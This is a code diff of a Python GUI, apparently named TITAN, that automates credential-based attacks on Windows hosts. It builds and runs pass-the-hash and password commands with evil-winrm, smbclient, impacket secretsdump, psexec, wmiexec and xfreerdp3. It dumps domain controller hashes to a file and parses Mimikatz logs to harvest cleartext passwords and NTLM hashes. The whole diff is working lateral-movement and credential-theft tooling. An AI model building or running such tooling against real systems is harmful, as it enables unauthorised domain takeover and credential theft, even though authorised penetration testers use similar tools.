@@ -123,9 +123,10 @@ class TitanGUI:
 
         grid = tk.Frame(strike_frame, bg=BG_DARK)
         grid.pack(pady=10)
-        tools = ["Evil-WinRM", "SMBClient", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
+        tools = ["Evil-WinRM", "SMBClient", "Psexec", "WMIExec", "XFreeRDP3", "SecretsDump"]
         for i, tool in enumerate(tools):
-            btn = tk.Button(grid, text=tool.upper(), command=lambda t=tool: self.launch(t), bg=BG_PANEL, fg=ACCENT, width=15, height=2)
+            btn = tk.Button(grid, text=tool.upper(), command=lambda t=tool: self.launch(t), 
+                            bg=BG_PANEL, fg=ACCENT, width=15, height=2)
             btn.grid(row=i//3, column=i%3, padx=10, pady=10)
             self.tool_btns[tool] = btn
 
@@ -134,12 +135,31 @@ class TitanGUI:
 
     def get_cmd(self, tool, target_ip, user, secret, c_type):
         impacket_secret = f"aad3b435b51404eeaad3b435b51404ee:{secret}" if c_type == "hash" else secret
-        if tool == "Evil-WinRM": return f"evil-winrm -i {target_ip} -u '{user}' " + (f"-H {secret}" if c_type == "hash" else f"-p '{secret}'")
-        elif tool == "SMBClient": return f"smbclient //{target_ip}/C$ -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'") + " -c 'ls'"
-        elif tool == "SecretsDump": return f"impacket-secretsdump '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
-        elif tool == "Psexec": return f"impacket-psexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip} -c 'whoami'"
-        elif tool == "WMIExec": return f"impacket-wmiexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip} 'whoami'"
-        elif tool == "XFreeRDP3": return f"xfreerdp3 /v:{target_ip} /u:'{user}' " + (f"/pth:{secret}" if c_type == "hash" else f"/p:'{secret}'") + " /cert:ignore +auth-only"
+        
+        if tool == "Evil-WinRM": 
+            return f"evil-winrm -i {target_ip} -u '{user}' " + (f"-H {secret}" if c_type == "hash" else f"-p '{secret}'")
+        
+        elif tool == "SMBClient": 
+            return f"smbclient //{target_ip}/C$ -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'") + " -c 'ls'"
+        
+        elif tool == "SecretsDump": 
+            clean_user = user
+            if "\\" in user:
+                clean_user = user.split("\\")[-1]
+            if c_type == "hash": 
+                return f"impacket-secretsdump -just-dc -hashes {impacket_secret} '{clean_user}'@{target_ip}"
+            else: 
+                return f"impacket-secretsdump -just-dc '{clean_user}:{secret}'@{target_ip}"
+        
+        elif tool == "Psexec": 
+            return f"impacket-psexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip} whoami"
+        
+        elif tool == "WMIExec": 
+            return f"impacket-wmiexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip} 'whoami'"
+        
+        elif tool == "XFreeRDP3": 
+            return f"xfreerdp3 /v:{target_ip} /u:'{user}' " + (f"/pth:{secret}" if c_type == "hash" else f"/p:'{secret}'") + " /cert:ignore +auth-only"
+        
         return ""
 
     def test_all_tools(self):
@@ -149,29 +169,45 @@ class TitanGUI:
         
         cred = self.data[target_ip]['creds'][idx]
         user, secret, c_type = cred['user'], cred['secret'], cred['type']
-        self.log_event(f"Bulk Test Started: Target {target_ip} as {user}")
 
         def run_tests():
-            fail_keywords = ["failed", "error", "denied", "not known", "invalid", "connection refused", "could not", "cannot", "unreachable"]
+            # Define specific strings that indicate a functional failure despite a "clean" exit
+            silent_fail_strings = [
+                "is not writable",
+                "access_denied",
+                "connection refused",
+                "was cannot"
+            ]
+            
             for tool, btn in self.tool_btns.items():
-                if tool == "Evil-WinRM": # Skip automated Evil-WinRM check
-                    btn.config(bg=BG_PANEL, fg=TEXT_DIM)
-                    continue
-
+                if tool == "Evil-WinRM": continue
+                
                 btn.config(bg="#34495E", fg="white") 
                 cmd = self.get_cmd(tool, target_ip, user, secret, c_type)
                 try:
-                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
-                    output = (result.stdout + result.stderr).lower()
-                    if result.returncode != 0 or any(kw in output for kw in fail_keywords):
+                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                    # Combine stdout and stderr for a comprehensive search
+                    combined_output = (result.stdout + result.stderr).lower()
+                    
+                    # 1. Check return code
+                    # 2. Check for known failure keywords
+                    # 3. Check for the specific "not writable" or empty output issue
+                    is_failed = (
+                        result.returncode != 0 or 
+                        any(msg in combined_output for msg in silent_fail_strings) or
+                        (tool in ["Psexec", "WMIExec"] and not result.stdout.strip())
+                    )
+
+                    if is_failed:
                         btn.config(bg=FAIL_RED, fg="white")
-                        self.log_event(f"TEST FAILED: {tool} on {target_ip}")
+                        self.log_event(f"FUNCTIONAL FAIL: {tool} on {target_ip} - {combined_output[:50]}...")
                     else:
                         btn.config(bg=SUCCESS_GREEN, fg="black")
                         self.log_event(f"TEST SUCCESS: {tool} on {target_ip}")
                 except Exception as e:
                     btn.config(bg=FAIL_RED, fg="white")
-                    self.log_event(f"TEST ERROR: {tool} on {target_ip} - {str(e)}")
+                    self.log_event(f"EXECUTION ERROR: {tool} - {str(e)}")
+        
         threading.Thread(target=run_tests, daemon=True).start()
 
     def update_creds(self, event=None):
@@ -249,14 +285,26 @@ class TitanGUI:
         idx = self.cred_cb.current()
         if idx == -1 or target_ip == "-- SELECT TARGET --": return
         cred = self.data[target_ip]['creds'][idx]
+        
         cmd = self.get_cmd(tool, target_ip, cred['user'], cred['secret'], cred['type'])
+        
         if cmd:
+            # Strip test flags if present
             launch_cmd = cmd.replace(" -c 'ls'", "").replace(" +auth-only", "").replace(" -c 'whoami'", "").replace(" 'whoami'", "")
+            
+            # CUSTOM LOGIC FOR SECRETSDUMP FILE OUTPUT
+            if tool == "SecretsDump":
+                output_file = f"{target_ip}_secretsdump.txt"
+                # Use 'tee' so you can still see the output in the terminal while it saves to the file
+                launch_cmd = f"{launch_cmd} | tee {output_file}"
+                self.log_event(f"LOGGING OUTPUT TO: {output_file}")
+
+            # Launch in a new terminal so the GUI doesn't freeze
             subprocess.Popen(['x-terminal-emulator', '-e', f'bash -c "{launch_cmd}; exec bash"'])
             self.log_event(f"TOOL LAUNCHED: {tool} on {target_ip} as {cred['user']}")
 
     def import_mimi(self):
-        """Fixed logic to parse Mimikatz output text files for User, Domain, and NTLM hashes"""
+        """Advanced parser: Prioritizes cleartext passwords, falls back to NTLM hashes."""
         file_path = filedialog.askopenfilename(title="Select Mimikatz Output", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
         if not file_path: return
         
@@ -266,38 +314,63 @@ class TitanGUI:
             return
 
         try:
-            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-                content = f.read()
+            # Handle potential UTF-16 encoding from Mimikatz logs
+            try:
+                with open(file_path, "r", encoding="utf-16") as f:
+                    content = f.read()
+            except (UnicodeError, UnicodeDecodeError):
+                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
             
-            # Split by Authentication Id blocks to isolate distinct credential sets
-            blocks = re.split(r'\* Authentication Id', content)
+            # Split by Authentication Id to isolate distinct user sessions
+            sessions = content.split('Authentication Id :')
             count = 0
             
-            for block in blocks:
-                user_match = re.search(r'User\s+:\s+(.+)', block)
-                dom_match = re.search(r'Domain\s+:\s+(.+)', block)
-                hash_match = re.search(r'NTLM\s+:\s+([a-fA-F0-9]{32})', block)
+            for session in sessions:
+                # 1. Identify User and Domain
+                user_match = re.search(r'\* Username : (.+)', session)
+                dom_match = re.search(r'\* Domain\s+: (.+)', session)
                 
-                if user_match and hash_match:
-                    user = user_match.group(1).strip()
-                    domain = dom_match.group(1).strip() if dom_match else "LOCAL"
-                    ntlm = hash_match.group(1).strip()
-                    
-                    # Skip machine accounts and empty entries
-                    if user.endswith('$') or user.lower() == "none": continue
-                    
-                    if target_ip not in self.data:
-                        self.data[target_ip] = {"hostname": self.host_entry.get() or "Imported", "creds": []}
-                    
-                    full_user = f"{domain}\\{user}" if domain != "LOCAL" else user
-                    if self.add_unique(target_ip, full_user, "hash", ntlm, "Mimikatz Import"):
+                if not user_match: continue
+                
+                user = user_match.group(1).strip()
+                domain = dom_match.group(1).strip() if dom_match else ""
+                
+                # Skip machine accounts and empty entries
+                if user == '(null)' or user.endswith('$'): continue
+                
+                # 2. Priority Logic: Scan for any cleartext password in the session
+                passwords = re.findall(r'\* Password : (.*)', session)
+                cleartext = None
+                for p in passwords:
+                    p_clean = p.strip()
+                    if p_clean and p_clean != '(null)':
+                        cleartext = p_clean
+                        break 
+
+                # 3. Fallback: Identify NTLM Hash
+                ntlm_match = re.search(r'\* NTLM\s+: ([a-fA-F0-9]{32})', session)
+                ntlm_hash = ntlm_match.group(1).strip() if ntlm_match else None
+
+                # 4. Ingest into TITAN Data
+                if target_ip not in self.data:
+                    self.data[target_ip] = {"hostname": self.host_entry.get() or "Imported", "creds": []}
+                
+                full_user = f"{domain}\\{user}" if domain and domain != "LOCAL" else user
+                
+                # Apply User Choice: Password if found, else NTLM
+                if cleartext:
+                    if self.add_unique(target_ip, full_user, "password", cleartext, "Mimi Cleartext"):
+                        count += 1
+                elif ntlm_hash:
+                    if self.add_unique(target_ip, full_user, "hash", ntlm_hash, "Mimi NTLM"):
                         count += 1
             
             self.save_config()
             self.target_cb['values'] = list(self.data.keys())
             self.update_creds()
-            self.log_event(f"MIMIKATZ IMPORT: Imported {count} hashes for {target_ip}")
-            messagebox.showinfo("Import Complete", f"Imported {count} hashes for {target_ip}.")
+            self.log_event(f"MIMIKATZ IMPORT: Processed {count} credentials for {target_ip}")
+            messagebox.showinfo("Import Complete", f"Successfully imported {count} credentials for {target_ip}.")
             
         except Exception as e:
             self.log_event(f"MIMIKATZ IMPORT ERROR: {str(e)}")
